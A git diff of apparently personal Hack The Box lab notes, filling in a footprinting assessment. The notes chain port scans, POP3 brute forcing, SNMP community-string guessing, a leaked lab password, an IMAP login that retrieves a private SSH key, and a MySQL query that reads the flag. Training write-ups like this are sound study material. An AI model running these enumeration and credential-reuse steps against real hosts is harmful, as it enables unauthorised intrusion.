@@ -1,10 +1,10 @@
 # Skill Assessments
 
 TODOS:
-- Footprinting
 - Pivoting, Tunneling, and Port Forwarding
 - AD
 - AD Bloodhound
+- Hashcat
 
 *Command*: 
 
@@ -432,65 +432,92 @@ hydra -l simon -P mynotes.txt 10.129.38.94 ssh -v -I
 
 ### Assessment 3
 
-*Command:*
+*Command:* Port scan
+- rustscan -a $TARGET -t 500 -b 1500
 
-*Result:*
-
----
-
-*Command:*
-
-*Result:*
+*Result:* Found TCP: 22,110,143,993,995
 
 ---
 
-*Command:*
-
+*Command:* IMAP/POP3 Capabilities
+- nmap -Pn -p110,995 -sV -sC $TARGET --script "pop3-capabilities or pop3-ntlm-info"
+- nmap -Pn -p143,993 -sV -sC $TARGET --script imap*
+  
 *Result:*
+- pop3-capabilities: AUTH-RESP-CODE STLS TOP UIDL RESP-CODES SASL(PLAIN) USER 
+- pop3-capabilities: SASL(PLAIN) TOP UIDL RESP-CODES USER AUTH-RESP-CODE PIPELINING CAPA
+- imap-capabilities: IMAP4rev1 more ID capabilities LITERAL+ IDLE STARTTLS have LOGIN-REFERRALS SASL-IR post-login listed Pre-login OK ENABLE AUTH=PLAINA0001
+- imap-capabilities: IMAP4rev1 ID capabilities LITERAL+ IDLE more have AUTH=PLAINA0001 SASL-IR post-login listed Pre-login OK ENABLE LOGIN-REFERRALS
+---
+
+*Command:* Pop3 brute force
+- nmap -Pn -p110,995 -sV -sC $TARGET --script "pop3-brute"
+  
+*Result:* No result, either with other wordlists
 
 ---
 
-*Command:*
+*Command:* UDP scan after hint
+- sudo nmap -Pn -sU $TARGET --min-rate 5000
 
-*Result:*
-
----
-
-*Command:*
-
-*Result:*
+*Result:* 161/udp   open   snmp
 
 ---
 
-*Command:*
+*Command:* Search community string, minimum rate
+- onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET-w 100
 
-*Result:*
-
----
-
-*Command:*
-
-*Result:*
+*Result:* $TAREGET **[backup]** Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
 
 ---
 
-*Command:*
+*Command:* snmpwalk -v2c -c backup 10.129.202.20
 
-*Result:*
+*Result:* Found username, domain, password
+
+```
+"Admin <tech@inlanefreight.htb>"
+"tom NMds732Js2761"
+```
+
+---
+
+*Command:* Access to IMAP + login to email + read email
+- nc -nv $TARGET 143
+- a1 LOGIN tom NMds732Js2761
+- f fetch 1:1 (BODY[HEADER.FIELDS (Subject)]) : Subject: KEY
+- f FETCH 1 BODY[text] 
+  
+*Result:* Found 1 email + private ssh key
 
 ---
 
-*Command:*
+*Command:* Chmod of sss key + login to ssh with key
+- chmod +600 id_rsa
+- ssh tom@$TARGET -i id_rsa
+  
+*Result:* Access to target with tom's key
 
-*Result:*
+---
+
+*Command:* history command
+
+*Result:* found mysql
 
 ---
 
-*Command:*
+*Command:* Access mysql + read flag
+- mysql -u tom -p
+- show databases; 
+- show columnns from users;
+- select * from users where username = 'HTB'; 
+  
+*Result:* Found database users, found flag
 
-*Result:*
 
----
+## Cracking Passwords with Hashcat
+### Assessment 
+
 
 *Command:*
 
